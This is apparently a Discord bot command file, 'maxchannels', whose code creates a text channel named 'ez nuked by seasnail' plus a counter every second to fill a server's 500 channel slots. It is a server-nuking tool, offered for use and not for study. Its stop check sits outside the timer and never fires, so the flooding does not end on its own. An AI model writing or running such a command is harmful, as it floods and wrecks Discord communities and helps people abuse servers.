const Discord = require("discord.js");
const client = new Discord.Client();
const newChannelName = ("ez nuked by seasnail");

module.exports = {
    name: 'maxchannels',
    execute(message, args){
        let counter = 0;

        setInterval(function(){
            message.guild.createChannel((newChannelName + " " + counter), "text")
            counter++;
        },1000);
        if (counter > 499) {
            client.destroy();
        }
    }
}

module.exports.config = {
    name: "maxchannels",
    description: "Fills all channel slots of a server \(max\: 500\).",
    usage: "\%maxchannels",
    accessableby: "Administrators",
    noalias: "No Aliases",
    aliases: []
}